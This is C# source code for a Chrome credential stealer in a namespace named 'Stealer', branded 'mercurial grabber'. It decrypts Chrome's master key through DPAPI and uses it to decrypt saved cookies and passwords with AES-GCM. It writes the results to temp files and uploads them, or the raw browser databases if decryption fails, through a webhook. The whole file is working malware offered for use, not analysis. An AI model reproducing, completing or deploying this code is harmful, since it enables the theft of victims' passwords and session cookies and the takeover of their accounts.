using System;
using System.Text;

using System.IO;
using System.Security.Cryptography;
namespace Stealer
{
    class Browser
    {
        private static string DecryptWithKey(byte[] encryptedData, byte[] MasterKey) /
        {
            byte[] iv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 }; 

            
            Array.Copy(encryptedData, 3, iv, 0, 12);

            try
            {
                
                byte[] Buffer = new byte[encryptedData.Length - 15];
                Array.Copy(encryptedData, 15, Buffer, 0, encryptedData.Length - 15);

                byte[] tag = new byte[16]; 
                byte[] data = new byte[Buffer.Length - tag.Length]; 

               
                Array.Copy(Buffer, Buffer.Length - 16, tag, 0, 16);

                
                Array.Copy(Buffer, 0, data, 0, Buffer.Length - tag.Length);

                AesGcm aesDecryptor = new AesGcm();
                var result = Encoding.UTF8.GetString(aesDecryptor.Decrypt(MasterKey, iv, null, data, tag));
                return result;
            }
            catch
            {
                return null;
            }
        }
        private static byte[] GetMasterKey()
        {
            string filePath = User.localAppData + @"\Google\Chrome\User Data\Local State";
            byte[] masterKey = new byte[] { };

            if (File.Exists(filePath) == false)
                return null;

            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));

            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                {
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value)); 

                }

            }

           
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);

            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                return null;
            }
        }



        public static void StealCookies()
        {
            string src = User.localAppData + @"\Google\Chrome\User Data\default\Cookies";
            string stored = User.tempFolder + "\\cookies.db";

            if (File.Exists(src))
            {
                Console.WriteLine("Located: " + src);
                try
                {
                    File.Copy(src, stored);
                }
                catch
                {
                }
                try
                {
                    SQLite db = new SQLite(stored);

                    db.ReadTable("cookies");

                    StreamWriter file = new StreamWriter(User.tempFolder + "\\cookies.txt");
                    for (int i = 0; i <= db.GetRowCount(); i++)
                    {
                        string value = db.GetValue(i, 12);
                        string hostKey = db.GetValue(i, 1);
                        string name = db.GetValue(i, 2);
                        string path = db.GetValue(i, 4);
                        string expires = "";
                        try
                        {
                            expires = Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(db.GetValue(i, 5))), TimeZoneInfo.Local));
                        }
                        catch
                        {
                        }

                        string result = String.Empty;

                        try
                        {
                            result = DecryptWithKey(Encoding.Default.GetBytes(value), GetMasterKey());
                        }
                        catch
                        {
                            result = "Error in deryption";
                        }

                        file.WriteLine("---------------- mercurial grabber ----------------");
                        file.WriteLine("value: " + result);
                        file.WriteLine("hostKey: " + hostKey);
                        file.WriteLine("name: " + name);
                        file.WriteLine("expires: " + expires);
                    }

                    file.Close();

                    File.Delete(stored);

                    Program.wh.SendData("", "cookies.txt", User.tempFolder + "\\cookies.txt", "multipart/form-data");
                    File.Delete(User.tempFolder + "\\cookies.txt");
                }

                catch (Exception ex)
                {
                    Program.wh.SendData("", "cookies.db", User.tempFolder + "\\cookies.db", "multipart/form-data");
                    Program.wh.Send("`" + ex.Message + "`");
                }
            }

            else
            {
                Program.wh.Send("`" + "Did not find: " + src + "`");
            }
        }



        public static void StealPasswords()
        {
            string src = User.localAppData + @"\Google\Chrome\User Data\default\Login Data";
            Console.WriteLine(src);

            if (File.Exists(src))
            {
                string stored = User.tempFolder + "\\login.db";
                Console.WriteLine("copy to " + stored);

                try
                {
                    File.Copy(src, stored);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
                try
                {
                    SQLite db = new SQLite(stored);
                    db.ReadTable("logins");

                    StreamWriter file = new StreamWriter(User.tempFolder + "\\passwords.txt");
                    for (int i = 0; i <= db.GetRowCount(); i++)
                    {
                        string host = db.GetValue(i, 0);
                        string username = db.GetValue(i, 3);
                        var password = db.GetValue(i, 5);

                        if (host != null)
                        {
                            if (password.StartsWith("v10") || password.StartsWith("v11"))
                            {
                                var masterKey = GetMasterKey();

                                if (masterKey == null)
                                {
                                    continue;
                                }

                                try
                                {
                                    password = DecryptWithKey(Encoding.Default.GetBytes(password), masterKey);
                                }
                                catch
                                {
                                    password = "Unable to decrypt";
                                }

                                file.WriteLine("---------------- mercurial grabber ----------------");
                                file.WriteLine("host: " + host);
                                file.WriteLine("username: " + username);
                                file.WriteLine("password: " + password);
                            }
                        }
                    }

                    file.Close();
                    File.Delete(stored);

                    Program.wh.SendData("", "passwords.txt", User.tempFolder + "\\passwords.txt", "multipart/form-data");
                    File.Delete(User.tempFolder + "\\passwords.txt");
                }
                catch (Exception ex)
                {
                    Program.wh.SendData("", "login.db", User.tempFolder + "\\login.db", "multipart/form-data");
                    Program.wh.Send("`" + ex.Message + "`");
                }

            }
            else
            {
                Program.wh.Send("`" + "Did not find: " + src + "`");
            }

        }
    }
}
